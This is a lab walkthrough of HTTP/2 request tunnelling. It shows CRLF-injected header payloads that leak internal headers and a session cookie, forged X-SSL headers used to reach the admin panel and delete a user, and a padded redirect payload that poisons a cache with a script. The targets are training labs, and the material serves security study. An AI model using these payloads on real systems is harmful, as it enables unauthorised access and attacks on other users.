Some servers have stricter policies and will not reuse the same connection between the frontend and backend to handle multiple requests, as it was in other examples.

For example, some servers allow only requests originating from the same IP address or the same client to reuse the connection.

Now you can't poison the socket to interfere with other users requests, but you can send a single request that will elicit two responses from the backend. This can enable you to hide a request and it's matching response from the frontend.

This technique can be used to bypass frontend security measures and also some other mechanisms which are designed specifically to prevent request smuggling.

In HTTP/2 if you receive a HTTP/2 response with what appears to be a HTTP/1 response in the body you can be confident that you've successfully tunneled a second request.

## Leaking internal headers via HTTP/2 request tunneling

There is a way to potentially trick the frontend into appending the internal headers inside a `frontent header` that will become a `backend body parameter`.

For example:

```http
...
Foo: bar\r\nContent-Length: 200\r\n\r\ncomment=
...
```

In this case there is only one request, but the frontend sees everything injected as part of a header, so adds any new headers after the trailing `comment=` string. But, the backend will see `\r\n\r\n` and think that it is the end of the header.

So, the `comment=` along with the internal headers are treated as part of the body, and the result is a comment parameter with the internal headers as its value.

### Blind request tunneling

Some frontend servers read all the data they receive from the backend, and some only will read the number of bytes specified in the `Content-Length` of the response, so only the first response is forwarded to the client. 

This results in a blind request vulnerability because you won't be able to see the response to your tunneled request.

### Non-blind request tunnelling using HEAD

Blind request tunnelling can be tricky, but sometimes these can be made non-blind by using `HEAD` requests.

Responses to the `HEAD` requests often contain a `Content-Length` header even that they don't have a body. This refers to the length of the resource that would be returned by a `GET` request to the same endpoint, and some frontend servers fail to account for this and attempt to read the bytes. 

So, if you successfully tunnel a request past a frontend, this behavior may cause it to over-read the response from the backend, and as a result, the response may contain bytes from hte start of the response to your tunnelled request.

Request:
```http
...
foo: bar\r\n \r\n GET /tunnelled HTTP/1.1\r\n Host: vulnerable-website.com\r\n X: x
...
```

Response:
```http
HTTP/1.1 200 OK Content-Type: text/html Content-Length: 4286 <!DOCTYPE html> <h1>Tunnelled</h1> <p>This is a tunnelled respo
...
```

If the endpoint to which the `HEAD` request returns a resource shorter than the tunnelled response that you want to read, it may be truncated before you can see anything interesting.

And if the `Content-Length` that is returned is longer than the response to your tunnelled request you will likely have a timeout as the frontend is waiting for additional bytes from the backend.

This can be overcome with a bit of trial and error:

- Point the `HEAD` request to another endpoint that returns a longer or shorter resource.
- If the resource is too short, use a reflected input in the `HEAD` request to inject arbitrary padding characters. Even that you won't actually see your input being reflected, the returned `Content-Length` will still increase accordingly.
- If the resource is too long, use a reflected input in the tunnelled request to inject arbitrary characters so that the length of the tunnelled response matches or exceeds the length of the expected content.

# Bypassing access controls via HTTP/2 request tunnelling

The lab is vulnerable to request smuggling because the frontend downgrades and fails to adequately sanitize incoming header names.

Access the admin panel at `admin` as the administrator and delete the user `carlos`.

The frontend don't reuse the connection to backend, so it is not vulnerable to the classic request smuggling attacks. But it's still vulnerable to request tunneling.

### Confirming the CLRF vulnerability

Send the`GET` request for the root endpoint to the repeater. 

Request a new header, and in the Name I've put:

```http
foo: bar\r\n
Host: halilIsHere.com
```

And as the value just some string: `test`.

When I sent this request I receive a response stating:

```http
HTTP/2 504 Gateway Timeout
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 155

<html><head><title>Server Error: Gateway Timeout</title></head><body><h1>Server Error: Gateway Timeout (3) connecting to halilIsHere.com</h1></body></html>
```

Confirming that there is the vulnerability.

The lab has a search function, and when searching for something the input is reflected.

<img width="773" alt="Pasted_image_20250117113630" src="https://github.com/user-attachments/assets/853c6b79-8d83-497c-90cc-13a1a6e71735" />

Send this request to the repeater, change it to the `POST` method, and remove the body, and also the Content-Length, as we want to inject these.

Request a new header and in the name put:

```http
just: something\r\n
Content-Length: 160\r\n
\r\n
search=
```

And as the value, just put something, I've put `halil`, and send the request, as the result inside the returned html file, we will have the following:

```html
<h1>
	0 search results for ': halil
	cookie: session=vy0jTjQifl8FmotN3Pwlejl5B3KKeRKt
	X-SSL-VERIFIED: 0
	X-SSL-CLIENT-CN: null
	X-FRONTEND-KEY: 5035228897772740
	Content-Length: 0
'</h1>
```

So we leaked the request headers, and there is also the cookie header and the frontend key.

Now let's use the leaked internals to get access to the admin page.

Send another request to the lab to repeater, and request a header, in the name put:

```http
just: something\r\n
\r\n
GET /admin HTTP/1.1
Host: 0ab9005f0436c1d186d22bf8003b0037.web-security-academy.net
X-SSL-VERIFIED: 1
X-SSL-CLIENT-CN: admninistrator
X-FRONTEND-KEY: 5035228897772740\r\n
\r\n
```

and as the value whatever you want, I've put `halil`.

As can be seen I've put the leaked headers and changed the `verified` to 1, and the `CN` to administrator.

When we sent the request, we got a response but only for the front page, and first nothing else can be seen.

Let's send a `HEAD` request to the front page, by using curl:

`curl --head https://lab.com/`

This tells us the `Content-Length` of the frontpage, which is 8791.

So, let's turn this `blind attack` to a `non-blind attack`.

Change the method from `GET` to `HEAD`, and send it, and we see a proxy error, stating that:

```html
<h1>Server Error: Received only 3608 of expected 8791 bytes of data</h1>
```

The 3608 is the length of the admin response that we are getting back.

In this case we need to find and request for a page that is really close, but smaller than the admin page with 3608 bytes.

if we `curl` to `lab.com/login` we see that the content-length is 3247, so instead of sending the request to the root endpoint let's send it here.

And inside the returned response html we have:

```html
                   <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
```

This tells us the link to delete `carlos`.

Now get that link and in the header that we requested before, and put `/admin`, so now we will go straight to the deletion link, instead of the admin page, like this:

<img width="509" alt="Pasted_image_20250117121457" src="https://github.com/user-attachments/assets/cb8ff268-2f30-42b5-8e0e-e721fd0613f3" />

Now we got the same proxy error, stating:

```html
<h1>Server Error: Received only 372 of expected 3247 bytes of data</h1>
```

But, the backend has executed the command, `carlos` account is deleted and the lab is solved.



# Web cache poisoning via HTTP/2 request tunneling

With non-blind request tunnelling, the headers from one response can be mixed and matched with the body of another.

If the response in the body reflects unencoded user input, this behavior can be leveraged for reflected XSS in contexts where the browser would not normally execute the code.

For example if the following response contains unencoded, attacker-controllable input:

```htp
HTTP/1.1 200 OK 
Content-Type: application/json { "name" : "test<script>alert(1)</script>" } [etc.]
```

the `content-type` means that this payload will simply be interpreted as JSON by the browser. But, what would happen if you time; the request to the backend? This response would appear inside the body of a different response, inheriting its headers, including `content-type`, and as caching takes place in the frontend, caches can be tricked into serving these mixed responses to other users.

## Web cache poisoning via HTTP/2 request tunnelling lab

The goal is to poison the cache in a way that when the victim visits the home page, it executes `alert(1)`. A victim user visits the home page every 15 seconds.

The frontend doesn't reuse the connection to the backend, so it is not vulnerable to classic request smuggling attacks. But, it's to request tunnelling.

### Confirming the vulnerability

Send a request to the root endpoint to Burp Repeater.

Request a new `path` header, and and a non-existent one, like `/halil HTTP/1.1\r\njust: something`, so now the request has two paths. When I send the request I receive a `404 Not Found` meaning that the second path takes precedence, and we got a CLRF vulnerability.

Now modify the value of the new path header to:

```http
/?cachebuster=1 HTTP/1.1\r\njust: something\r\n\r\nGET /cajschal HTTP/1.1\r\nHost: 0a1600d60414a680b28b89fe00d20093.web-security-academy.net
```

`/cachebuster=1` is included to make sure that we don't poison the response to the actual front-page.

Now we got a `200` but we don't see anything from the smuggled request, like a `404` because this is a Blind Request Smuggling Attack.

This because the frontend is only reading in the response from the backend up to the `content-length` of the front-page. 

To turn this to a `non-blind` instead of `GET` use `HEAD`, and send it. The response takes too long, because the HEAD request will only request headers and not the content, and the frontend is trying to read in the response up to the content length of the front-page which is likely larger than 8000 bytes and the `404` has much smaller.

Now use curl to see the content length of the frontpage.

`curl --head lab.com`

and we see that it is 8679.

Now, let's find a url which has bigger content-length, and I will look into the posts.

The postid=8 got bigger content-length and we got a `200 OK`, and we can see also the request headers for the smuggled request.

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=cHo13P5qK4VgU91RhykQNGxUQDYugV9Z; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Keep-Alive: timeout=0
Content-Length: 8957
```

Now, send a request to a javascript file to the repeater.

We want to make sure to inject javascript to our response,  so from this `GET /resources/labheader/js/labHeader.js HTTP/2` modify it to this `GET /resources/labheader/js?<script>alert(1)</script> HTTP/2` and since this site uses on-site redirection, we will se in the response the endpoint put here with our JS in the header.

```http
HTTP/2 302 Found
Location: /resources/labheader/js/?<script>alert(1)</script>
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 0
```

Now copy the `/resources/labheader/js/?<script>alert(1)</script>` and put into our smuggled request, and send it but we got a timeout, because the response to our smuggled request is smaller than the actual length of the front-page.

So, append a big number of character after the script tag, so it will make the response of the request bigger than the front-page. Make sure to remove `\r\n` after the characters when you paste it. It took around 10.000 characters, and send it

The response we got is:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=8fRaciyUEo0FrilTV6nqU4Hhct421cL5; Secure; HttpOnly; SameSite=None
Content-Length: 8679
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss

HTTP/1.1 302 Found
Location: /resources/labheader/js/?<script>alert(1)</script>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
```

And then if we visit the `https://0af9009204774ae981c2c55600390018.web-security-academy.net/?cachebuster=1` we got the JS alert.

Now poison the front-page, by removing the `cachebuster=1` from the root-endpoint path, and the lab is solved.




```



```http
/?cachebuster=1 HTTP/1.1
just: something

GET /acmldkcke HTTP/1.1
Host: 0af9009204774ae981c2c55600390018.web-security-academy.net/
```


